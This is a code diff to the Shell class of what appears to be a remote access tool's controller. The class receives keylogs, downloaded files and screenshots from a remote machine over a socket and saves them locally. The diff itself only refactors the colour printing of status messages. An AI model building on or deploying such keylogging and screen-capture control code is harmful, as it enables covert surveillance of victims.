@@ -6,7 +6,7 @@ from time import strftime
 
 from src.server.pipe import SafeSocket
 from src.shell.ps1 import Ps1
-from src.stdout.color import Color
+from src.stdout.colors import color
 
 
 class Shell:
@@ -37,11 +37,11 @@ class Shell:
             logs = path.join(_dir, f"keylog_{self.time}.txt")
             self.log = self.safe_sock.recv()
             if self.log[:3] == "[!]":
-                print(Color(self.log).b_red())
+                color.b_red.print(self.log)
             else:
                 with open(logs, 'w') as log_file:
                     log_file.write(self.log)
-                print(Color(f"Saved {logs}\n").grn())
+                color.grn.print(f"Saved {logs}\n")
         elif cmd == "print":
             print(self.log)
 
@@ -59,7 +59,7 @@ class Shell:
                     break
         with open(download, 'wb') as file:
             file.write(b64decode(payload))
-        print(Color(f'Saved {download}\n').grn())
+        color.grn.print(f'Saved {download}\n')
 
     def screenshot(self):
         _dir = self.make_dir("screenshots")
@@ -67,24 +67,24 @@ class Shell:
         payload = self.safe_sock.recv()
         payload = b64decode(payload)
         if payload[:3] == "[!]":
-            print(Color(payload).b_red())
+            color.b_red.print(payload)
         else:
             with open(image, "wb") as screenshot:
                 screenshot.write(payload)
                 screenshot.close()
-            print(Color(f"Saved {image}\n").grn())
+            color.grn.print(f"Saved {image}\n")
 
     def print_stdout(self):
         stdout = self.safe_sock.recv()
         if stdout[:3] == "[+]":
             if len(stdout) > 3:
-                stdout = Color(f"{stdout}\n").b_grn()
+                stdout = color.b_grn.get(f"{stdout}\n")
             else:
                 return
         elif stdout[:3] == "[!]":
-            stdout = Color(f"{stdout}\n").b_red()
+            stdout = color.b_red.get(f"{stdout}\n")
         elif stdout[:3] == "[*]":
-            stdout = Color(f"{stdout}\n").ylw()
+            stdout = color.ylw.get(f"{stdout}\n")
         print(stdout)
         return
 
